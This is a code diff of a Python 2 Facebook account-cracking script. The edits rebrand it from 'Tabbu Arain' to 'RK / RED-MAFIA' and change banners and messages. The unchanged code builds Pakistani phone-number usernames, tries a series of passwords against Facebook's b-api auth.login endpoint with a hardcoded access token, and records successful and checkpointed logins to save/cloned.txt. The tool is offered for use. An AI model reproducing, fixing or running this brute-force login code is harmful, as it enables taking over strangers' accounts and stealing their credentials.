@@ -22,7 +22,7 @@ try:
 except ImportError:
     os.system('pip2 install request')
     time.sleep(1)
-    os.system('Then type: python2 tabbu-old-crack')
+    os.system('Then type: python2 boss404')
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -84,7 +84,7 @@ print  """
                      
 \033[1;94mFACEBOOK  TABBU ARAIN
                   
-\033[1;92mWHATSAPP  +994402197773
+\033[1;92mWHATSAPP +994402197773
 
 """
 
@@ -92,23 +92,22 @@ print  """
 
 logo1 = """
   
-████████  █████  ██████  ██████  ██    ██ 
-   ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-   ██    ███████ ██████  ██████  ██    ██ 
-   ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-   ██    ██   ██ ██████  ██████   ██████  
-                                          
-                                          
- 
- █████  ██████   █████  ██ ███    ██ 
-██   ██ ██   ██ ██   ██ ██ ████   ██ 
-███████ ██████  ███████ ██ ██ ██  ██ 
-██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
-██   ██ ██   ██ ██   ██ ██ ██   ████ 
+
+████████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗
+╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║   ██║
+   ██║   ███████║██████╔╝██████╔╝██║   ██║
+   ██║   ██╔══██║██╔══██╗██╔══██╗██║   ██║
+   ██║   ██║  ██║██████╔╝██████╔╝╚██████╔╝
+   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ 
+     
+
+ █████╗ ██████╗  █████╗ ██╗███╗   ██╗
+██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║
+███████║██████╔╝███████║██║██╔██╗ ██║
+██╔══██║██╔══██╗██╔══██║██║██║╚██╗██║
+██║  ██║██║  ██║██║  ██║██║██║ ╚████║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                      
-                                     
-                                                                                      
-                                                  
 
 ╔══──────────────────────────╗─══╗
 ║ OWNER  👑  TABBU ARAIN       ║║
@@ -121,25 +120,27 @@ logo1 = """
 """
 logo2 = """
 
-████████  █████  ██████  ██████  ██    ██ 
-   ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-   ██    ███████ ██████  ██████  ██    ██ 
-   ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-   ██    ██   ██ ██████  ██████   ██████  
-                                          
-                                          
-    
- █████  ██████   █████  ██ ███    ██ 
-██   ██ ██   ██ ██   ██ ██ ████   ██ 
-███████ ██████  ███████ ██ ██ ██  ██ 
-██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
-██   ██ ██   ██ ██   ██ ██ ██   ████ 
+
+
+████████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗
+╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║   ██║
+   ██║   ███████║██████╔╝██████╔╝██║   ██║
+   ██║   ██╔══██║██╔══██╗██╔══██╗██║   ██║
+   ██║   ██║  ██║██████╔╝██████╔╝╚██████╔╝
+   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ 
+     
+
+ █████╗ ██████╗  █████╗ ██╗███╗   ██╗
+██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║
+███████║██████╔╝███████║██║██╔██╗ ██║
+██╔══██║██╔══██╗██╔══██║██║██║╚██╗██║
+██║  ██║██║  ██║██║  ██║██║██║ ╚████║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                      
-                                     
-                                                            
+                         
                                                    
                          DON'T COPY MY SCRIPT
-                                      TABBU-ARAIN          
+                                      TABBU ARAIN          
                                         THANKS (T.A)
 ╔══──────────────────────────╗─══╗
 ║ OWNER  👑  TABBU ARAIN       ║║
@@ -167,10 +168,10 @@ while (loop == 'true'):
 	    time.sleep(2)
             loop = 'false'
         else:
-            print "\033[1;94mIncorrect Password"
+            print "\033[1;94mWrong Password"
             os.system('xdg-https://wa.me/+994402197773')
     else:
-        print "\033[1;94mIncorrect Username"
+        print "\033[1;94mWrong Username"
         os.system('xdg-https://wa.me/+994402197773')
 
 
@@ -207,9 +208,9 @@ def Zeek():
     time.sleep(0.10)
     print '\x1b[1;95m[0] ══BACK '
     time.sleep(0.10)
-    print '\x1b[1;96m ════T.A'
+    print '\x1b[1;96m ════RK'
     time.sleep(0.10)
-    print '\x1b[1;97m════TABBU-ARAIN'
+    print '\x1b[1;97m════RED-MAFIA'
     time.sleep(0.10)
     print '\x1b[1;91m ════DONT COPY MY SCRIPT'
     time.sleep(0.10)
@@ -226,7 +227,7 @@ def action():
     elif peak =="1":              
         os.system("clear")
         print logo2
-        print "\033[1;94mEnter any PAKISTANI Mobile Code"+'\n'
+        print "\033[1;94mEnter any Pakistan Mobile Code Number"+'\n'
         print '\033[1;92mEnter any Code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
         for i in numm:
             print('x' * i)
@@ -247,10 +248,10 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxx = str(len(id))
-    jalan ('\033[1;91mTotal ids Accounts: '+xxx)
+    jalan ('\033[1;91m Total ids Accounts: '+xxx)
     jalan ('\033[1;92mSim code you choose: '+c)
     jalan ("\033[1;93mWait  Start Cracking...")
-    jalan ("\033[1;94mTo Stop Process Press Ctrl+Z")
+    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -264,14 +265,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;32m[TABBU-OK]  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[TABBU-CP] ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -281,14 +282,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;32m[TABBU-OK]  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;32m[RK-OK]  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[TABBU-CP] ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -298,14 +299,14 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;32m[TABBU-OK]  ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m[TABBU-CP] ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
@@ -315,14 +316,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;32m[TABBU-OK]  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m[TABBU-CP] ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -332,14 +333,14 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;32m[TABBU-OK]  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m[TABBU-CP] ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
@@ -379,7 +380,7 @@ def action():
 
     
     raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
-    login()
-
-if _name_ == '_main_':
+    login() 
+          
+if __name__ == '__main__':
     login()
